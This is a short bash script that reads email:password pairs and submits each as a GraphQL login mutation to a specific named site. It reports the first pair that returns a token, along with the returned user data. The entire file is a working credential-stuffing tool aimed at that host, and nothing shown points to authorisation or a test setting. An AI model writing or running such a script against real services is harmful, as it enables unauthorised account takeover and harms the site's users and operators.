#!/usr/bin/env bash
set -euo pipefail

query='mutation Login($email:String!,$password:String!){login(email:$email,password:$password){token user{id email name role}}}'

while IFS=: read -r email password; do
  payload=$(jq -nc --arg email "$email" --arg password "$password" --arg query "$query" \
    '{query:$query,variables:{email:$email,password:$password}}')
  out=$(curl -sS -X POST https://mail.equestriasociety.com/graphql \
    -H 'Content-Type: application/json' \
    --data "$payload")
  if ! printf '%s' "$out" | rg -q '"errors"'; then
    printf 'SUCCESS %s:%s\n%s\n' "$email" "$password" "$out"
    exit 0
  fi
  printf 'FAIL %s:%s\n' "$email" "$password"
done

printf 'NO_HITS\n'
